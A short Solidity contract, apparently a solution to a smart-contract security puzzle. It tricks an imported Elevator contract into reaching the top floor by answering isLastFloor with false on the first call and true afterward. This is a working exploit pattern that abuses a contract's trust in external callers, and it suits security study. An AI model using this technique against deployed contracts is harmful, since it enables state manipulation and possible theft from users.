//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Elevator.sol";

/**
 * This building uses Elevator, and is used by Elevator. This will trick the elevator into 
 * going to the top floor. 
 */
contract Building {
    bool private lastFloor = false;
    
    /**
     * The first time this is called, it will return false. Afterwards, it will return true
     * every time. 
     * @return (bool) false, then true 
     */
    function isLastFloor(uint) external returns (bool) {
        bool output = lastFloor;
        lastFloor = true; 
        return output;
    }
    
    /**
     * Invokes the elevator and sends it to the top. 
     * @param _elevator address of Elevator contract
     */
    function goToTop(address _elevator) public {
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(1);
    }
}